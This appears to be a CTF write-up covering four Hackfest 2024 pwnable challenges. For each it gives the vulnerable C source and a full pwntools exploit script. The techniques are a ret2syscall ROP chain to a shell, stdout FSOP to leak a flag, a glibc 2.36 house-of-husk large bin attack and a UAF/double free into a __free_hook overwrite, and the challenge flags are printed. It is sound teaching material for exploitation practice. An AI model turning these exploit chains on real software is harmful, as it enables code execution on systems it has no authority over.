---
title: Hackfest 2k24 pwnable challenges writeups.
tags:
  - pwn
  - Buffer
  - Overflow
  - Heap
  - UAF
  - printf
  - house_of_husk
  - libc-236
---
Those are some brief writeups for the [[pwnables]].


# STATIC

#### TL;DR
	ret2syscall
		put a "/bin/sh\x00" string in bss.
		 call execve syscall.

```
attachment ➤ file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=649fb893c6e374f21c95319bceacfa2c95ca1445, for GNU/Linux 3.2.0, stripped
```

notes : 
	statically linked + stripped.

##### source.c
```c++
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char buffer[0x50];
  printf(">> ");
  read(0, buffer, 0x123); //[1]
}
```

1 -> Buffer Overflow occures here.

```python
from pwn import *
import time

p = process("./main")

rax = p64(0x000000000041706c)
rdi = p64(0x0000000000401fd0)
rsi = p64(0x000000000040aa38)
rdx = p64(0x000000000045d7a7) #rdx_rbx
syscall = p64(0x0000000000409172)
bss = p64(0x000000000049f040 + 0x100 + 0x8)
rop = flat(
        b"A" * 88,
        rax,
        p64(0),
        rdi,
        p64(0),
        rsi,
        bss,
        rdx,
        p64(0x60),
        p64(0),
        syscall,
        rax,
        p64(0x3b),
        rdi,
        bss,
        rsi,
        p64(0),
        rdx,
        p64(0) * 2,
        syscall
        )
#gdb.attach(p)
p.sendlineafter(b">> ", rop)
time.sleep(0.1)
p.send(b"/bin/sh\x00")
p.interactive()
```


``hackfest{503af008833e09bb65d50815a064a9719ddb13b6a3f918ad436548685ac22f8b}``

# filePlay

#### TL;DR 
	write using fsop (on stdout)

##### source.c
```c++
#include <stdio.h>
#include <stdlib.h>

char file_content[0x50];

void read_file() {
    FILE *file = fopen("./flag.txt", "r");
    if (file == NULL) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }
    size_t size_read = fread(file_content, 1, 0x50 - 1, file);
    if (size_read == 0) {
        perror("Error reading file");
        exit(EXIT_FAILURE);
    }

    file_content[size_read] = '\0';

    fclose(file);
}


void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  read_file();
  printf(">> ");
  read(0, stdout, 10 * 0x8);
}

```


```python
from pwn import *
p = process("./main")

flag = 0x4040a0

payload = flat(
        p64(0xfbad1800), # 1
        p64(0) * 3,
        p64(flag), # 2.1
        p64(flag + 0x50) # 2.2
        )
gdb.attach(p)

p.sendline(payload)

p.interactive()
```

1 -> we set the flags on the file structures si it's PUTTING (```c++ 
(f->_flags & _IO_CURRENTLY_PUTTING)```)
2.1 -> we set ``_IO_write_base`` to the address ``file_contents``
2.2 -> we set ``_IO_write_ptr`` to ``file_contents + bytes_to_put``.

``hackfest{503af008833e09bb65d50815a064a9719ddb13b6a3f918ad436548685ac22f8b}``

# nofmt

This challenge is a reincarnation of the housk of husk but in the newer libcs (glibc 2.36).

TL;DR
	Large Bin Attack (instead of unsorted bin)
	Forge new  __printf_function_table and __printf_arginfo_table
	call register_printf_specifier
	 profit.


##### source.c

```c++
unsigned __int64 delete()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &v1);
  if ( v1 <= 0xF )
  {
    if ( allocations[v1] )
      free((void *)allocations[v1]); // obvious UAF here.
    else
      puts("Page not found.");
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return v2 - __readfsqword(0x28u);
}
```

```c++
unsigned __int64 sub_4012ED()
{
  unsigned int v0; // ebx
  unsigned int index; // [rsp+0h] [rbp-20h] BYREF
  _DWORD size[5]; // [rsp+4h] [rbp-1Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &index);
  if ( index <= 0xF )
  {
    printf("Size: ");
    __isoc99_scanf("%u", size);
    if ( size[0] <= 0x900u )
    {
      if ( size[0] > 0x4FFu ) 
      {
	      // WE CAN ONLY ALLOCATE CHUNKS IN ]0x4ff, 0x900].
        v0 = index;
        allocations[v0] = malloc(size[0]);
        sizes[index] = size[0];
      }
      else
      {
        puts("Too small.");
      }
    }
    else
    {
      puts("Too big.");
    }
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return *(_QWORD *)&size[1] - __readfsqword(0x28u);
}
```

```python
from pwn import *
import time
context.arch = "amd64"
context.log_level = "debug"

p = process("./nofmt_patched")
elf = ELF("./nofmt_patched")
libc = ELF("./libc.so.6")

def menu(ch):
    p.sendlineafter(b">",str(ch))

def add(idx, sz):
    menu(1)
    p.sendlineafter(b"Index: ",str(idx))
    p.sendlineafter(b"Size: ",str(sz))

def delete(idx):
    menu(2)
    p.sendlineafter(b"Index: ",str(idx))

def edit(idx, content):
    menu(3)
    p.sendlineafter(b"Index: ",str(idx))
    p.sendafter(b"Content: ",content)

def show(idx, norecv=False):
    menu(4)
    p.sendlineafter(b"Index: ",str(idx))
    if not norecv:
        p.recvuntil(b"Content: ")
        return p.recvline()[:-1]

if __name__=="__main__":

    add(0, 0x600)
    add(1, 0x508)
    delete(0)
    add(2, 0x620) # puts chunk 0 into large bin.

    fd = u64(show(0).ljust(8,b"\x00"))
    libc.address= fd - 0x1f7130
    print(hex(libc.address))
    edit(0, b"a" * 8)
    bk = u64(show(0)[-6:].ljust(8,b"\x00"))
    edit(0, b"A" * 0x10)
    fd_nextsize = u64(show(0).replace(b"A",b"").ljust(8,b"\x00"))
    heap_base = fd_nextsize - 0x290
    print(hex(heap_base))
    edit(0, flat([fd,bk]))
    add(0, 0x600)
    add(3, 0x508)
    
    printf_function_table = libc.address + 0x1f8980
    printf_arginfo_table = libc.address + 0x1f7890
    
    delete(2)
    add(4,0x660)
    edit(2, flat([0, 0, 0, printf_function_table - 0x20]))
    delete(0)
    add(5,0x660) # __printf_function_table now points to chunk #0
    edit(0,flat([fd,heap_base + 0xdb0, heap_base + 0xdb0, heap_base + 0xdb0]))
    edit(2,flat([heap_base + 0x290, fd, heap_base + 0x290, heap_base + 0x290]))
    add(2,0x620)
    time.sleep(0.1)
    add(0,0x600)
    add(6,0x508)
    time.sleep(0.1)
    add(15,0x650)
    
    delete(5)
    add(7,0x680)
    edit(5,flat([0 , 0 , 0, printf_arginfo_table - 0x20]))
    delete(15)
    add(8,0x680) # __printf_arginfo_table now points to chunk #15
    edit(15,flat([fd + 0x10, heap_base + 0x1f60, heap_base + 0x1f60, heap_base + 0x1f60]))
    edit(5,flat([heap_base + 0x2ae0, fd + 0x10, heap_base + 0x2ae0, heap_base + 0x2ae0]))
    add(5,0x660)
    add(15,0x650)
    
    #win
    edit(0, p64(0) * (ord('s') - 2) + p64(0x4011D6))
    time.sleep(0.1)
    edit(15, p64(0) * (ord('s') - 2) + p64(0x4011D6))
   
    show(0, True)

    p.interactive()
```


# Message

No show functions, abuse stdout file struct.

##### TL;DR
	Simple UAF + double free
    craft an unsorted bin chunk, change the least 2 bytes (might have a nibble bruteforce in certain envs) to get stdout file structure, null lsb of write_base you get a leak, from there nomal hooks hijacking.



##### source.c
```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
  char sender[0x8];
  char receiver[0x8];
  char details[0x80];
} letter;

letter * letters[0x10];

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

void menu() {
  puts("1. Create A Letter");
  puts("2. Edit A Letter");
  puts("3. Delete A Letter");
  puts("4. Exit");
  printf("Choice > ");
}

void add_letter() {
  int index = -1;
  unsigned int size = 0;
  letter * l = NULL;
  for (int i = 0; i < 0x10; i++) {
    if (!letters[i]) {
      index = i;
      break;
    }
  }
  if (index != -1) {
    l = (letter *) malloc(sizeof(letter));
    if (l) {
      printf("Sender : ");
      read(STDIN_FILENO, l->sender, 0x8);
      printf("Receiver : ");
      read(STDIN_FILENO, l->receiver, 0x8);
      printf("Details : ");
      read(STDIN_FILENO, l->details, 0x80);
      letters[index] = l;
    } else {
      perror("malloc()");
      return;
    }
  }
}

void subMenu() {
  puts("1. Sender");
  puts("2. Receiver");
  puts("3. Details");
  printf("Choice > ");
}

void edit_letter() {
  int index = -1, choice = -1;
  printf("Index : ");
  scanf("%d", &index);
  if (index >= 0 && index < 0x10 && letters[index]) {
    subMenu();
    scanf("%d", &choice);
    getchar();
    switch (choice) {
      case 1:
        printf("Sender : ");
        read(STDIN_FILENO, letters[index]->sender, 0x8);
        break;
      case 2:
        printf("Receiver : ");
        read(STDIN_FILENO, letters[index]->receiver, 0x8);
        break;
      case 3:
        printf("Details : ");
        read(STDIN_FILENO, letters[index]->details, 0x80);
        break;
      default:
        puts("Invalid Choice");
        break;
    }
  } else {
    puts("Invalid Index");
  }
}

void delete_letter() {
  int index = -1;
  printf("Index : ");
  scanf("%d", &index);
  if (index >= 0 && index < 0x10 && letters[index]) {
    free(letters[index]);
  } else {
    puts("Invalid index");
  }
}

int main() {
  setup();
  int choice = 0;
  for (;;) {
    menu();
    scanf("%d", &choice);
    getchar();
    switch (choice) {
      case 1:
        add_letter();
        break;
      case 2:
        edit_letter();
        break;
      case 3:
        delete_letter();
        break;
      case 4:
        exit(1337);
      default:
        continue;
    }
  }
}
```

```python
from pwn import *

context.arch = "amd64"

p = process("./main")
elf = ELF("./main", checksec = False)
libc = elf.libc

sla = lambda a, b : p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)

def cmd(choice) : sla(b"Choice > ", str(choice))

def alloc(s, r, d):
    cmd(1)
    sa(b"Sender : ", s)
    sa(b"Receiver : ", r)
    sa(b"Details : ", d)

def edit(idx, choice, data):
    cmd(2)
    sla(b"Index : ", str(idx))
    cmd(str(choice))
    sa(b" : ", data)

def delete(idx):
    cmd(3)
    sla(b"Index : ", str(idx))


if __name__ == "__main__":
    for i in range(2):
        alloc(b"retr0", b"retr0", b"retr0rocks")
    for i in range(8):
        delete(0)
    edit(0, 1, p16(0xc760)) # In this line in certain env we need to bruteforce nibble apart from the fixed offset which is 0x760
    alloc(b"retr0", b"retr0", b"retr0rocks")
    alloc(p64(0xfbad1800), p64(0), p64(0) * 2 + b"\x00") # we set flags to putting, and overwrite _IO_write_base lsb with NULL byte so we expand the buffer to output.
    
    libc.address = u64(p.recvuntil(b"1. ")[8 : 16]) - 0x3ed8b0
    log.info(f'libc base @ 0x{libc.address:x}')
    
    for i in range(2):
        delete(0)
    
    edit(0, 1, p64(libc.sym.__free_hook))
    alloc(b"/bin/sh\x00", b"retr0", b"retr0rocks")
    alloc(p64(libc.sym.system), p64(0), p64(0))
    delete(4) 
    gdb.attach(p)
    p.interactive()

```

``hackfest{d023ebd7eb540bbae10fef187c8c68898b2b56ffea56372bb13ab027cc8c945f}``


Hope everyone enjoyed the challenges, see you in the finals.
